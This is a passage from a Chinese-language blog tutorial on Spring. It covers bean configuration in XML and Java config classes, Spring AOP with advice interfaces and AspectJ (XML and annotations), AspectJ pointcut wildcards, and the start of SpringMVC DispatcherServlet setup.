class="attr">class</span>=<span class="string">"org.springframework.beans.factory.annotation.PersistenceAnnotationBeanPostProcessor "</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@PersistenceContext可用(?)"</span></span><br><span class="line"><span class="comment">&lt;!------------------或者---------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面四条,但无法使用@Component,即还是要把这个类的bean配置一下,如在xml里配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-----------------或者----------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面一条,并且可以使用@Component,从指定package开始递归扫描 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.test.pojo.human"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="基于java配置类的配置"><a href="#基于java配置类的配置" class="headerlink" title="基于java配置类的配置"></a>基于java配置类的配置</h3><p>即是将xml配置文件里的配置提出来,放到一个java文件里,成为一个配置类.这样的好处即是不需要xml文件了,实现去xml化.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//btw spring boot里的@SpringBootApplication一条等于@Configuration,@EnableAutoConfiguration,@ComponentScan三条</span></span><br><span class="line"><span class="comment">//@ComponentScan("com.test.pojo.human")开启扫描</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Configuration_or_somefckingothernamebutendwithConfig</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configuration_or_somefckingothername</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Bean("name2")</span></span><br><span class="line">    <span class="meta">@Bean</span>(name=&#123;<span class="string">"infoX"</span>,<span class="string">"InformationX"</span>,<span class="string">"name2"</span>&#125;)</span><br><span class="line">    <span class="meta">@Scope</span>(<span class="string">"singleton"</span>)<span class="comment">//Bean的实例如何创建,生命周期</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InformationX <span class="title">info_or_others</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InformationX();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Description</span>(<span class="string">"一些描述"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> human <span class="title">human_or_others</span><span class="params">(InformationX infoX,String n)</span></span>&#123;</span><br><span class="line">        human a= <span class="keyword">new</span> human();</span><br><span class="line">        human.setNameX(n);</span><br><span class="line">        human.setInformationX(infoX);</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!--2018-03-31--><p>btw: Scope标识此bean的作用域,常在多线程问题中使用.</p><h3 id="什么时候该在xml里定义bean什么时候该用扫描"><a href="#什么时候该在xml里定义bean什么时候该用扫描" class="headerlink" title="什么时候该在xml里定义bean什么时候该用扫描"></a>什么时候该在xml里定义bean什么时候该用扫描</h3><ul><li><p>在xml里定义bean</p><ul><li>非常严谨需要一个个定义</li><li>外部引入,无法修改的类</li><li>我就是享受那种一个个定义的快感的时候</li></ul></li><li><p>不需要定义bean</p><ul><li>怕在xml中配置的时候手滑</li><li>懒</li></ul></li></ul><h2 id="Spring-AOP"><a href="#Spring-AOP" class="headerlink" title="Spring AOP"></a>Spring AOP</h2><p><strong>A</strong>spect-<strong>O</strong>riented <strong>P</strong>rogramming(AOP,面向切面的程序设计)是对于<strong>O</strong>bject-<strong>o</strong>riented <strong>p</strong>rogramming(OOP,面向对象程序设计)的一个改进.</p><p>我对于AOP的理解: 即hook住了一个类(要代理的类)中的函数,使得我们可以在函数的之前之后跑一段其他代码.SpringAOP使得获取到的对象(Bean)为代理后的而不是原有的.</p><p>btw:当代理类中的函数互相调用时,SpringAOP不会起作用.</p><h3 id="通过继承接口实现的AOP"><a href="#通过继承接口实现的AOP" class="headerlink" title="通过继承接口实现的AOP"></a>通过继承接口实现的AOP</h3><p>此处的接口指的是SpringAOP拦截器的接口,具体来说即继承<em>org.springframework.aop</em>下的函数:</p><ul><li><em>MethodBeforeAdvice.before()</em></li><li><em>AfterReturningAdvice.afterReturning()</em></li><li><em>MethodInterceptor.invoke()</em></li><li><em>ThrowsAdvice的AfterThrowing()</em>(ThrowAdvice并没有此接口,但是继承后的函数名依然要是AfterThrowing,<a href="https://stackoverflow.com/questions/29419189/how-does-spring-know-that-throwsadvice-afterthrowing-needs-to-be-called" target="_blank" rel="noopener">原因</a>)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> <span class="keyword">implements</span> <span class="title">MethodBeforeAdvice</span>,<span class="title">MethodInterceptor</span>,<span class="title">AfterReturningAdvice</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">(Object o, Method method, Object[] objects, Object o1)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(MethodInvocation invocation)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturning</span><span class="params">(Object o, Method method, Object[] objects, Object o1)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Spring的xml配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxImpl"</span> <span class="attr">class</span>=<span class="string">"com.test.xxxxImpl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxHelper"</span><span class="attr">class</span>=<span class="string">"com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!----------------------------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!--JdkRegexpMethodPointcut的Patternc为一个正则表达式字符串组,定义了要注入的函数(切点)--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--即Advice(通告?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxAdvice"</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.support.JdkRegexpMethodPointcut"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name="pattern" value="fun_name" /&gt;   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"patterns"</span>&gt;</span></span><br><span class="line">true        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">true            <span class="tag">&lt;<span class="name">value</span>&gt;</span>fun_name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">true        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 关联切点(point)与实现接口的函数(advice)--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即Advisor(顾问?)  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxCutAdvisor"</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.support.DefaultPointcutAdvisor"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"advice"</span> <span class="attr">ref</span>=<span class="string">"xxxxHelper"</span> /&gt;</span>         </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pointcut"</span> <span class="attr">ref</span>=<span class="string">"xxxxAdvice"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------或者--------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面两句 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxCutAdvisor"</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.support.RegexpMethodPointcutAdvisor"</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pattern"</span>&gt;</span>    </span><br><span class="line">         <span class="tag">&lt;<span class="name">value</span>&gt;</span>fun_name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"advice"</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"xxxxHelper"</span>/&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- proxy(代理) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在代码实际运行时通过proxy创建代理对象从而实现AOP --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"proxy"</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.framework.ProxyFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">ref</span>=<span class="string">"xxxxImpl"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"interceptorNames"</span> <span class="attr">value</span>=<span class="string">"xxxxCutAdvisor"</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 接口,不写则直接代理指定类(当然不推荐),写了通过接口代理指定类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"proxyInterfaces"</span> <span class="attr">value</span>=<span class="string">"com.test.xxxx"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--------------------------或------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面的配置, 使得上面的target可以使用通配符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.framework.autoproxy.BeanNameAutoProxyCreator"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"beanNames"</span> <span class="attr">value</span>=<span class="string">"*_name,some*,xxxxImpl"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"interceptorNames"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span>xxxxCutAdvisor<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!---------------------------或--------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面的配置, 自动扫描 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 若未匹配则不代理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通过xml来配置-AspectJ"><a href="#通过xml来配置-AspectJ" class="headerlink" title="通过xml来配置(AspectJ)"></a>通过xml来配置(AspectJ)</h3><p>此种方法相比较第一种方法的最大区别即是不用继承接口.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before_or_dsoiafd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around_or_aisfad</span><span class="params">(ProceedingJoinPoint invocation)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after_or_sajdoip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>Spring的xml配置文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxHelper"</span> <span class="attr">class</span>=<span class="string">"com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">"xxxxHelper"</span>&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 定义切点 --&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- expression内的是AspectJ表达式 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"init_cutpoint"</span> <span class="attr">expression</span>=<span class="string">"execution(public com.test.xxxx.fun_name(..))"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 前置通知 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">pointcut-ref</span>=<span class="string">"init_cutpoint"</span> <span class="attr">method</span>=<span class="string">"before_or_dsoiafd"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 后置通知 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">pointcut-ref</span>=<span class="string">"init_cutpoint"</span> <span class="attr">method</span>=<span class="string">"after_or_sajdoip"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 环绕通知 --&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!--也可以直接写AspectJ表达式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">pointcut</span>=<span class="string">"execution(* com.test.xxxx.fun_name(..))"</span> <span class="attr">method</span>=<span class="string">"around_or_aisfad"</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="通过注解来配置-AspectJ"><a href="#通过注解来配置-AspectJ" class="headerlink" title="通过注解来配置(AspectJ)"></a>通过注解来配置(AspectJ)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span><span class="comment">//使得Spring可以自动扫描</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"execution(public com.test.xxxx.fun_name(..))"</span>)<span class="comment">//括号内的都是AspectJ表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init_cutpoint</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        System.out.println(joinPoint.getSignature().getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before_or_dsoiafd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Around</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around_or_aisfad</span><span class="params">(ProceedingJoinPoint invocation)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after_or_sajdoip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Spring的xml配置文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> /&gt;</span><span class="comment">&lt;!-- 扫描@Aspect --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 更懒一些还可以选择@Component :D --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxImpl"</span> <span class="attr">class</span>=<span class="string">"com.test.xxxxImpl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxxxHelper"</span> <span class="attr">class</span>=<span class="string">"com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="AspectJ表达式"><a href="#AspectJ表达式" class="headerlink" title="AspectJ表达式"></a>AspectJ表达式</h3><p>AspectJ表达式通配符</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>***</td><td>匹配任何数量的字符</td></tr><tr><td><em>..</em></td><td>匹配任何数量的<strong>任何数量的字符</strong>,换句话说即匹配任何数量的***</td></tr><tr><td><em>+</em></td><td>跟在类后面,表示此类的子类(不包含其本身)</td></tr></tbody></table><ul><li>对于简单的例子<ul><li><em>execution(public com.test.xxxxImpl.fun_name(..)))</em></li></ul></li></ul><table><thead><tr><th>参数</th><th>作用 </th></tr></thead><tbody><tr><td><em>public</em></td><td>public类型</td></tr><tr><td><em>com.test.xxxxImpl</em></td><td>包名</td></tr><tr><td><em>.</em></td><td>连接包名与函数(方法)名 </td></tr><tr><td><em>fun_name</em></td><td>函数(方法)名</td></tr><tr><td><em>(..)</em></td><td>所有参数</td></tr></tbody></table><p>那么可以推出</p><table><thead><tr><th style="text-align:left">表达式</th><th>作用</th></tr></thead><tbody><tr><td style="text-align:left"><em>execution(public com.test.xxxxImpl.fun_name(..)))</em></td><td>任意参数的public的com.test.xxxImple.fun_name函数</td></tr><tr><td style="text-align:left"><em>execution(public com.test.xxxx+.fun_name(..)))</em></td><td>任意参数的public的实现了com.test.xxx的fun_name函数的函数</td></tr><tr><td style="text-align:left"><em>execution(public com.test.xxxx+.</em>(..)))*</td><td>任意参数的public的实现了com.test.xxx的任何函数的函数</td></tr><tr><td style="text-align:left"><em>execution(</em> com.test.xxxx+.<em>(..)))</em></td><td>任意参数的任意类型的实现了com.test.xxx的任何函数的函数</td></tr><tr><td style="text-align:left"><em>execution(public com.test.</em>(..)))*</td><td>任意参数的public的com.test包下的任何类(com.test.*)的任何函数</td></tr><tr><td style="text-align:left"><em>execution(public com.test..</em>(..)))*</td><td>任意参数的public的com.test.<em>/com.test.</em>.*的任何函数</td></tr></tbody></table><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><p>配置<em>log4j</em>后,使用<em>context.getBean()</em>获取<em>Bean</em>,调用类中的函数</p><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><p>SpringMvc(全称Spring Web MVC,位于spring-webmvc.jar)通过一个叫做<em>DispatcherServlet</em>的Servlet来获取 <strong>Model</strong>And<strong>View</strong> 来传递内容,并在<code>View</code>(一般是.jsp)中将<code>Model</code>渲染出来从而生成web页面.</p><p>btw: Spring5中引入了一个新的web框架Spring-webflux</p><h2 id="SpringMVC与Servlet容器-如Tomcat-的配置"><a href="#SpringMVC与Servlet容器-如Tomcat-的配置" class="headerlink" title="SpringMVC与Servlet容器(如Tomcat)的配置"></a>SpringMVC与Servlet容器(如Tomcat)的配置</h2><h3 id="有多个Servlet的配置"><a href="#有多个Servlet的配置" class="headerlink" title="有多个Servlet的配置"></a>有多个Servlet的配置</h3><ul><li>需要配置<em>[Servlet-name]-serlvet.xml</em></li></ul><p>在<em>web.xml</em>中配置<em>DispatcherServlet</em>即可,就如其名,它是个<em>Servlet</em>,他将<em>url-pattern</em>中的请求转发到关联的的<em>serlet-name</em>中,这样的好处即是可以将多个<em>Servlet</em>的<em>Bean</em>分离(或者说是每个<em>Servlet</em>的<em>WebApplicationContext</em>),互不影响.</p><p>在<em>web.xml</em>下进行如此配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servlet_name<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servlet_name<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/example/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 